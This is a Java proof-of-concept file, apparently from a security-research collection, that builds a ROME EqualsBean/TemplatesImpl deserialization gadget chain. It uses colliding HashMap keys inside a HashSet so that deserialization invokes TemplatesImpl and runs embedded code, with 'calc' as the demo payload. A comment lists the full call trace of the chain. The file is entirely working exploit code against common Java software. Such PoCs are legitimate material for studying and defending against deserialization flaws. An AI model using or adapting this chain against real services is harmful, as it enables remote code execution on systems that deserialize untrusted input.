package com.javasec.pocs.rome;

import com.javasec.utils.SerializeUtils;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.HashSet;

/**
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
 * equals:103, EqualsBean (com.sun.syndication.feed.impl)
 * equals:472, AbstractMap (java.util)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readObject:334, HashSet (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * deserTester:264, SerializeUtils (com.javasec.utils)
 * main:25, EqualsBeanC (com.javasec.pocs.rome)
 * [*]source:equals
 */
public class EqualsBeanC {
    public static void main(String[] args) throws Exception {
        Templates templatesImpl = SerializeUtils.getTemplate("calc");
        EqualsBean equalsBean = new EqualsBean(String.class, "pop");
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap.put("yy",equalsBean);
        hashMap.put("zZ",templatesImpl);
        hashMap2.put("zZ",equalsBean);
        hashMap2.put("yy",templatesImpl);
        HashSet<Object> hashSet = new HashSet<>();
        hashSet.add(hashMap);
        hashSet.add(hashMap2);
        SerializeUtils.setFieldValue(equalsBean, "_beanClass", Templates.class);
        SerializeUtils.setFieldValue(equalsBean, "_obj", templatesImpl);
        SerializeUtils.deserTester(hashSet);
    }
}
